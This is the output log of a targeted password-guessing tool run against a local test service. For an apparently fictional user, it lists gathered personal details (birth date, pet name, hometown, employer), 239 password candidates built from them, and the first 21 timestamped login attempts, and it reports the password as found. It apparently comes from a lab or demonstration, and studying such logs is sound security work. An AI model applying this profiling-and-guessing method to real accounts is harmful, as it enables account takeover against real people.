Known Password Attack Log
Target: 127.0.0.1:8081
Username: john.smith
Intelligence Gathering: Successful
Attack started: 2025-07-28 10:20:52
Total attempts: 46
Password candidates generated: 239
Success: Yes
Found password: John1985!

==================================================
Target Intelligence:
==================================================
full_name: John Smith
first_name: John
last_name: Smith
birth_year: 1985
birth_date: 15031985
age: 39
pet_name: Buddy
hometown: Boston
current_city: Boston
favorite_team: Patriots
company: TechCorp
job_title: Developer
interests: ['technology', 'football', 'gaming']
common_numbers: ['15', '03', '1985', '85']

==================================================
Generated Password Candidates:
==================================================
 1. 15031985
 2. john@85
 3. BOSTON85
 4. 123John
 5. 45John
 6. john01
 7. JOHN1985
 8. Buddy!
 9. 1234John
10. John8901
11. John345
12. 34John
13. 56john
14. John2345
15. Boston1985*
16. Buddy85*
17. Boston1985$
18. Buddy85#
19. Buddy$
20. 23John
21. 85John
22. buddy85
23. 456John
24. JOHN2024
25. 345john
26. 567john
27. john1234
28. Buddy2024
29. john7890
30. 901john
31. Boston85#
32. passwordjohn
33. johnpass
34. 3456john
35. john67
36. 9012john
37. 1503
38. john890
39. 123john85
40. johntechcorp
41. JOHN$
42. JOHN#
43. buddy1985
44. 78John
45. johnpassword
46. John1985!
47. john34
48. 78john
49. John34
50. JohnSmith12345
51. 7890John
52. John*85
53. BUDDY85
54. 89john
55. John$24
56. 0123John
57. BUDDY2024
58. John67
59. john@
60. john2345
61. 2345john
62. 45john
63. john56
64. john123
65. 8901john
66. Buddy#
67. john90
68. john8901
69. 1john85
70. techcorp85
71. 12john
72. 9012John
73. Buddy85@
74. JOHN!
75. 23john
76. boston1985
77. john345
78. buddy2024
79. John85#
80. 234john
81. boston85
82. JohnTechcorp
83. john12
84. 12John85
85. John890
86. 1john
87. 1985
88. John1985*
89. 678John
90. 6789john
91. JohnSmith123
92. john45
93. Buddy@85
94. 890John
95. 8901John
96. John$85
97. John85!
98. Patriots85
99. 01John
100. John2024
101. john0123
102. 01john
103. JOHN@
104. 7890john
105. TECHCORP85
106. john23
107. BOSTON1985
108. 89John
109. john567
110. 1John85
111. Patriots123
112. 234John
113. John123!
114. john234
115. 789John
116. John9012
117. John78
118. JohnSmith1234
119. 1985john
120. John45
121. 56John
122. john2024
123. John85@
124. 678john
125. 123john
126. 890john
127. passwordJohn
128. John90
129. 456john
130. Boston85$
131. John!24
132. john#
133. john1985
134. 1John
135. 123John85
136. Boston1985#
137. 4567John
138. John567
139. John56
140. John1985$
141. 5678John
142. 789john
143. 1985John
144. Boston85!
145. john5678
146. john89
147. John@24
148. 90john
149. Boston85*
150. john78
151. john456
152. 67John
153. 4567john
154. John@85
155. John23
156. john$85
157. TECHCORP1985
158. John456
159. 0123john
160. John901
161. 85john
162. John#24
163. john4567
164. 34john
165. John#85
166. BUDDY1985
167. John012
168. john!85
169. 3456John
170. john!
171. John4567
172. john789
173. 12john85
174. Buddy*
175. John1985#
176. John0123
177. Boston1985!
178. John6789
179. john678
180. 6789John
181. John123
182. John3456
183. John234
184. JOHN*
185. Buddy85!
186. John85$
187. 67john
188. johnjohn85
189. JohnJohn85
190. John!85
191. 2345John
192. Techcorp1985
193. Buddy85$
194. john*85
195. 901John
196. 567John
197. John89
198. john901
199. Buddy@
200. john$
201. Patriots1234
202. techcorp1985
203. Boston1985@
204. Patriots1985
205. John01
206. john3456
207. JohnJohn
208. John678
209. Boston85@
210. John1985@
211. Patriots12345
212. John*24
213. Johnpass
214. john123!
215. 012John
216. John1234
217. john85
218. Buddy1985
219. John7890
220. john*
221. 12John
222. JohnSmith85
223. John5678
224. JOHN85
225. 012john
226. John12
227. johnjohn
228. 1234john
229. 345John
230. John85*
231. Techcorp85
232. John789
233. john6789
234. 90John
235. john9012
236. john012
237. Johnpassword
238. john#85
239. 5678john

==================================================
Detailed Attempt Log:
==================================================
[2025-07-28 10:20:52] Attempt #1: john.smith:15031985 - FAILED (Pattern: BirthYear) (Response: 0.003s)
[2025-07-28 10:20:53] Attempt #2: john.smith:john@85 - FAILED (Pattern: BirthYear(short) + Special) (Response: 0.002s)
[2025-07-28 10:20:55] Attempt #3: john.smith:BOSTON85 - FAILED (Pattern: BirthYear(short)) (Response: 0.003s)
[2025-07-28 10:20:56] Attempt #4: john.smith:123John - FAILED (Pattern: FirstName + CommonNumbers) (Response: 0.002s)
[2025-07-28 10:20:58] Attempt #5: john.smith:45John - FAILED (Pattern: FirstName) (Response: 0.003s)
[2025-07-28 10:21:00] Attempt #6: john.smith:john01 - FAILED (Pattern: Unknown) (Response: 0.003s)
[2025-07-28 10:21:01] Attempt #7: john.smith:JOHN1985 - FAILED (Pattern: BirthYear) (Response: 0.003s)
[2025-07-28 10:21:03] Attempt #8: john.smith:Buddy! - FAILED (Pattern: PetName + Special) (Response: 0.002s)
[2025-07-28 10:21:05] Attempt #9: john.smith:1234John - FAILED (Pattern: FirstName + CommonNumbers) (Response: 0.002s)
[2025-07-28 10:21:06] Attempt #10: john.smith:John8901 - FAILED (Pattern: FirstName) (Response: 0.002s)
[2025-07-28 10:21:07] Attempt #11: john.smith:John345 - FAILED (Pattern: FirstName) (Response: 0.002s)
[2025-07-28 10:21:09] Attempt #12: john.smith:34John - FAILED (Pattern: FirstName) (Response: 0.003s)
[2025-07-28 10:21:10] Attempt #13: john.smith:56john - FAILED (Pattern: Unknown) (Response: 0.004s)
[2025-07-28 10:21:12] Attempt #14: john.smith:John2345 - FAILED (Pattern: FirstName) (Response: 0.004s)
[2025-07-28 10:21:13] Attempt #15: john.smith:Boston1985* - FAILED (Pattern: BirthYear + Hometown + Special) (Response: 0.002s)
[2025-07-28 10:21:15] Attempt #16: john.smith:Buddy85* - FAILED (Pattern: BirthYear(short) + PetName + Special) (Response: 0.003s)
[2025-07-28 10:21:16] Attempt #17: john.smith:Boston1985$ - FAILED (Pattern: BirthYear + Hometown + Special) (Response: 0.002s)
[2025-07-28 10:21:17] Attempt #18: john.smith:Buddy85# - FAILED (Pattern: BirthYear(short) + PetName + Special) (Response: 0.003s)
[2025-07-28 10:21:19] Attempt #19: john.smith:Buddy$ - FAILED (Pattern: PetName + Special) (Response: 0.004s)
[2025-07-28 10:21:20] Attempt #20: john.smith:23John - FAILED (Pattern: FirstName) (Response: 0.003s)
[2025-07-28 10:21:21] Attempt #21: john.smith:85John - FAILED (Pattern: FirstName + BirthYear(short)) (Response: 0.002s)
